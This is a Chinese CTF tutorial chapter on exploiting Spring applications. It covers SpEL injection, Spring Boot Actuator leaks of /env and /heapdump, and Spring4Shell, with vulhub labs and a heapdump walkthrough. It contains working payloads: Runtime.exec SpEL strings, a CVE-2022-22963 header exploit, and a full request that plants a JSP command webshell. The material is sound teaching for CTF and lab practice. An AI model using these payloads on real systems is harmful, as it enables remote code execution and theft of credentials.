---
comments: true
---

# Spring漏洞

> [ProbiusOfficial/Hello-CTF](https://github.com/ProbiusOfficial/Hello-CTF)

本章面向在 CTF 中遇到 Java Web 题就两眼一抹黑的同学。Spring 全家桶的历史漏洞非常多，我们「够用即止」：只需要知道最常考的三类——**SpEL 表达式注入**、**Actuator 未授权访问**、**Spring4Shell（CVE-2022-22965）**，再配上一道例题，就能应对绝大多数入门到中级的 Spring 题了。

## Spring 生态极简介绍

Java Web 的原始形态是 Servlet：每个请求对应一个类，手写 `doGet`/`doPost`，繁琐且难以维护。Spring 就是为了让这件事不那么痛苦而出现的框架。对做题而言，你只需要分清两个概念：

- **Spring MVC**：一个 Web 框架。核心是「控制器（Controller）」——用注解把一个 Java 方法绑定到某个 URL 上，比如 `@RequestMapping("/hello")`。请求进来后，框架负责把参数解析好、塞进方法里。
- **Spring Boot**：一个「脚手架」。传统的 Spring 配置要写一堆 XML，Spring Boot 的口号是约定大于配置——内置 Tomcat，打一个 jar 包 `java -jar` 就能跑。现在 CTF 里的 Java Web 题几乎全是 Spring Boot 应用。

一个最简 Spring Boot 控制器长这样：

```java
@RestController
public class HelloController {
    @GetMapping("/hello")
    public String hello(@RequestParam String name) {
        return "Hello " + name;
    }
}
```

**在 CTF 中怎么认出目标是 Spring？** 几个明显特征：

- 报错页面是经典的 "Whitelabel Error Page"；
- 响应头里有 `X-Application-Context`；
- 随便访问一个不存在的路径，返回 JSON 里带 `timestamp`、`status`、`error`、`path` 字段；
- 端口常见 `8080`，路径下挂着 `/actuator`、`/env` 等端点。

另外提醒一点：Java 题本地调试比较重，本章所有环境都可以直接用 vulhub 一键起容器，不会用 Docker 的同学请先阅读「Docker与漏洞环境」一章。

## SpEL 表达式注入

### 什么是 SpEL

SpEL（Spring Expression Language）是 Spring 自带的表达式语言，作用和 Python 的 Jinja2 模板里的 `{{ }}` 非常像——在运行期对一段字符串求值。如果你做过 SSTI（见「SSTI注入」一章），SpEL 注入的思路几乎一模一样。

SpEL 表达式用 `${...}` 或 `#{...}` 包裹，可以出现在很多配置和注解里：

```java
@Value("${app.name}")              // 读配置
@PreAuthorize("hasRole('ADMIN')") // 权限注解里的表达式
```

危险的写法是开发者把用户输入拼进表达式里再求值：

```java
@RestController
public class SpelController {
    @GetMapping("/spel")
    public String spel(@RequestParam String exp) {
        // 典型的漏洞写法：用户输入直接进 SpEL 解析器
        ExpressionParser parser = new SpelExpressionParser();
        return parser.parseExpression(exp).getValue().toString();
    }
}
```

访问 `/spel?exp=1+1`，返回 `2`——说明输入被当作表达式执行了。

### Payload 构造

SpEL 里有个关键特性：`T()` 运算符可以引用任意 Java 类。于是命令执行就是一句话的事：

```java
T(java.lang.Runtime).getRuntime().exec('id')
```

在真实题目里通常要读回显，`exec` 返回的是 `Process` 对象，需要把输出流读出来。常用的一条龙 payload：

```java
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /flag').getInputStream()).useDelimiter('\\A').next()
```

逐步拆开看：

1. `T(java.lang.Runtime).getRuntime().exec('cat /flag')` —— 执行命令，得到 `Process`；
2. `.getInputStream()` —— 拿到命令的 stdout；
3. `new java.util.Scanner(...).useDelimiter('\A').next()` —— 把流一次性读成字符串（`\A` 表示全文边界）。

绕过滤的思路也和 SSTI 相通：如果题目过滤了 `Runtime`、`T(` 等关键字，可以尝试字符串拼接（`T(java.lang.Ru'+'ntime)`）、反射调用 `Class.forName`、利用 `getClass().forName(...)` 等方式变形。核心原则不变：**找到一个能调用任意类方法的表达式，再把结果转成字符串带出来**。

### 注入点在哪里

除了上面这种故意写出的解析器，历史上真实组件的 SpEL 注入点很多，CTF 常考的有：

- **Spring Data REST** 的 PATCH 请求（CVE-2017-8046）；
- **Spring Cloud Function** 的 `spring.cloud.function.routing-expression` 请求头（CVE-2022-22963）——这个在 CTF 里出镜率很高，payload 形如：

```http
POST /functionRouter HTTP/1.1
Host: target:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

hello
```

## Actuator 未授权访问

### Actuator 是什么

Spring Boot Actuator 是内置的「监控套件」，为运维提供一批 HTTP 端点来查看应用状态。问题出在：**很多开发者把它直接暴露在公网，且没有鉴权**。这在 CTF 里基本等于送分。

在 Spring Boot 1.x 中端点挂在根路径下（`/env`、`/heapdump`），2.x 之后统一挂在 `/actuator/` 下（`/actuator/env`），做题时两个都要试。

先访问 `/actuator` 看看暴露了哪些端点：

```bash
curl http://target:8080/actuator
```

返回的 JSON 里 `_links` 会列出所有可用端点，常见的利用价值如下。

### /env 与 /configprops：读配置

```bash
curl http://target:8080/actuator/env | jq .
```

`/env` 会返回应用的全部环境变量和配置项。老版本（Spring Boot 1.x）是 **明文** 的，数据库密码、云厂商的 `accessKey`、`secret`、JWT 密钥经常直接躺在里面；2.x 之后敏感值默认打码成 `******`，但打码规则不完整，换 `org.springframework.boot.actuate` 之外的路径或用 `/configprops` 有时能看到原文。

### /heapdump：内存转储，信息泄露重灾区

```bash
curl -o heapdump http://target:8080/actuator/heapdump
```

`/heapdump` 会下载一个 JVM 堆快照（HPROF 文件，通常几十 MB 起）。应用运行期间出现过的明文数据——请求头里的 Cookie、Authorization、刚提交的密码、配置里的密钥——都可能还在内存里没来得及释放。

CTF 场景下不需要上 MAT 这种重型工具，直接 `strings` 加 grep 往往就够：

```bash
strings heapdump | grep -iE 'flag|password|secret|Authorization' | sort -u
```

也可以用开源工具 `JDumpSpider` 自动提取 heapdump 里的各类敏感信息（数据源、Redis、Cookie 等）。

### /refresh 与 /env POST：从读配置到 RCE

如果 `/actuator/env` 支持 POST，配合 `/actuator/refresh` 重载配置，就可以远程修改应用属性。经典利用链有两条：

- **eureka.client.serviceUrl.defaultZone** 指向恶意 Eureka Server，配合 xstream 反序列化打 RCE；
- **spring.datasource.url / spring.cloud.config.uri** 等属性改成恶意地址，配合 `/refresh` 让应用去连攻击者的服务。

在 CTF 里更多是简化版本：POST 修改某个属性后直接读 flag，或改 `spring.main.sources` 之类。记住「**改属性 → POST /refresh 生效**」这个两步套路即可。

```bash
curl -X POST http://target:8080/actuator/env \
  -H 'Content-Type: application/json' \
  -d '{"name":"some.property","value":"evil"}'
curl -X POST http://target:8080/actuator/refresh
```

## Spring4Shell（CVE-2022-22965）

### 原理：一次「参数绑定」引发的写入

先补一个前置知识：Spring MVC 的参数绑定机制。当 Controller 接收一个对象参数时，请求里的 `a.b.c=value` 形式的参数会被框架自动沿着 getter 链一路赋值下去。比如传 `user.address.city=Beijing`，框架就会调用 `user.getAddress().setCity("Beijing")`。

问题在于：每个 Java 对象都有 `getClass()`，而 `Class` 又能拿到 `classLoader`。于是攻击者可以构造参数沿着这条链走：

```
class.module.classLoader.resources.context.parent.pipeline.first.xxx
```

最终摸到 Tomcat 的日志阀门 `AccessLogValve`，把它的配置改掉——**日志文件名改成 `.jsp`，日志内容（pattern）写入一句话木马，日志目录指向 webapp 根目录**。下一次 Tomcat 记访问日志时，就把 webshell 写进了网站目录里。整个过程不需要上传文件，纯靠 HTTP 参数绑定完成任意文件写入，这也是它被戏称为 "Spring4Shell"、与 Log4Shell 齐名的原因。

漏洞触发条件比较苛刻（这也是为什么 CTF 环境都是精心配置的）：

- JDK 9+（因为 JDK 9 引入的 `module` 绕过了旧补丁对 `class.classLoader` 的拦截）；
- Spring 以 **war 包部署在外置 Tomcat** 上（Spring Boot 默认的内嵌 Tomcat + jar 部署不受影响，因为没有可写的 webapp 目录）。

### 利用：写入 JSP Webshell

标准利用就是一连串参数绑定，把 Tomcat 访问日志改造成 JSP 马。一个典型请求（对 vulhub 的靶场）：

```http
POST / HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

参数的含义对应 AccessLogValve 的属性：

- `pattern` —— 日志每行写的内容，这里塞了一段 JSP 命令执行马（URL 编码后）；
- `suffix` —— 日志文件后缀，改成 `.jsp`；
- `directory` —— 日志目录，指向 `webapps/ROOT`；
- `prefix` / `fileDateFormat` —— 拼出固定的文件名 `tomcatwar.jsp`（清空日期后缀防止文件名带时间戳）。

发完请求后等 Tomcat 落盘日志，webshell 就在 `/tomcatwar.jsp`，用法：

```bash
curl 'http://target:8080/tomcatwar.jsp?pwd=j&cmd=cat%20/flag'
```

实际做题时建议直接用公开 EXP 脚本，不用手撸这串编码。

## 本地复现：vulhub 一键起环境

以上所有漏洞在 [vulhub](https://github.com/vulhub/vulhub) 里都有现成环境，推荐本地复现一遍再做题。前提是你已经装好 Docker（参考「Docker与漏洞环境」一章）：

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/spring/CVE-2022-22965
docker compose up -d
# 等待构建完成，访问 http://127.0.0.1:8080
docker compose down   # 打完记得关掉环境
```

本章对应的目录：

- `vulhub/spring/CVE-2022-22963` —— Spring Cloud Function SpEL 注入；
- `vulhub/spring/CVE-2022-22965` —— Spring4Shell；
- `vulhub/spring/CVE-2017-8046` —— Spring Data REST SpEL 注入；
- `vulhub/spring/CVE-2018-1273` —— Spring Data Commons 绑定注入。

Actuator 泄露的靶场没有官方 vulhub 条目，但 NSSCTF、CTFHub 等平台上大量题目都是这一类，识别特征也很明显（`/actuator` 可访问），直接线上练即可。

## CTF 例题：Actuator heapdump 拿 flag

> 题目类型：Spring Boot Actuator 未授权访问，经典送分流程。

**1. 信息收集。** 打开题目是一个简单的登录页。扫目录（工具用法见「Web入门题单」一章）发现 `/actuator` 可访问：

```bash
curl http://challenge.example.com:8080/actuator
```

```json
{
  "_links": {
    "self": {"href": "http://challenge.example.com:8080/actuator"},
    "heapdump": {"href": "http://challenge.example.com:8080/actuator/heapdump"},
    "env": {"href": "http://challenge.example.com:8080/actuator/env"}
  }
}
```

**2. 先翻 /env。** 访问 `/actuator/env`，快速浏览 JSON，没有发现明文的密码或 flag（2.x 打码了），但有 heapdump 端点——继续。

**3. 下载 heapdump 并检索。** 既然是登录页，用户刚提交过的密码很可能还在 JVM 堆内存里，而题目大概率就是「admin 密码即 flag」或「登录后拿 flag」：

```bash
curl -o heapdump http://challenge.example.com:8080/actuator/heapdump
strings heapdump | grep -iE 'flag\{|password' | sort -u
```

输出里出现：

```
{"username":"admin","password":"flag{heapdump_1eak_is_dangerous}"}
```

**4. 收尾。** 拿到的字符串正是 flag；如果密码不是 flag，就用它登录后台，在后台页面拿 flag。

**复盘要点：**

- Actuator 题的核心套路是「**枚举端点 → /env 读配置 → /heapdump 翻内存**」，三步走能解决九成同类题；
- heapdump 检索的关键是猜关键字：`flag`、`password`、`secret`、登录接口的参数名；
- 这类漏洞属于「敏感信息泄露」的 Java 版，和「敏感信息泄露」一章里 `.git`、`.DS_Store` 泄露的思路一脉相承——服务器把你没料到的东西直接递到了你手上。

## 小结

- **SpEL 注入**：`T(java.lang.Runtime).getRuntime().exec()`，思路对标 SSTI，重点记 Spring Cloud Function 的请求头注入；
- **Actuator**：`/actuator` 枚举端点，`/env` 读配置，`/heapdump` 用 strings+grep 翻内存，`/refresh` 配 POST /env 改属性；
- **Spring4Shell**：参数绑定链 `class.module.classLoader...` 改 Tomcat 日志配置写 JSP 马，条件苛刻（JDK9+、war 部署），CTF 里照抄 EXP 即可。

遇到 Java Web 题不要慌——先找 Whitelabel 报错和 `/actuator`，再看输入点能不能打 SpEL，多数题就这两个方向。
